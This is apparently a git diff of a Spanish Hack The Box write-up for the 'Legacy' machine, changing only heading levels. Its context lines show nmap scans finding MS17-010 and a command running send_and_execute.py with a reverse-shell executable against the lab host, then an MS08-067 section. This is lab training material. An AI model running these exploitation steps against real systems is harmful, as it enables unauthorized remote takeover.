@@ -1,6 +1,6 @@
 # Legacy ![Avatar](https://www.hackthebox.eu/storage/avatars/60dc190c4c015cfe3a3aef9b5afca254_thumb.png)     
 
-### Initial Scan
+## Initial Scan
 
 ```nmap
 139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
@@ -24,7 +24,7 @@ Host script results:
 |_  message_signing: disabled (dangerous, but default)
 |_smb2-time: Protocol negotiation failed (SMB2)
 ```
-### Enumeration
+## Enumeration
 
 Busquemos vulnerabilidades asociadas a los puertos abiertos
 ```bash
@@ -47,9 +47,9 @@ sudo nmap -p 445 --script vuln 10.10.10.4
 |        servers (ms17-010).
 ```
 
-### Exploit
+## Exploit
 
-#### MS17-010
+### MS17-010
 
 Utilizaremos el script de send_and_execute de este repositorio
 ```web
@@ -63,7 +63,7 @@ Ejecutamos el script mencionado arriba
 ```bash
 python2.7 send_and_execute.py 10.10.10.4 rev_shell.exe
 ```
-#### MS08-67
+### MS08-67
 
 Utilizaremos el siguiente script para la explotación
 ```
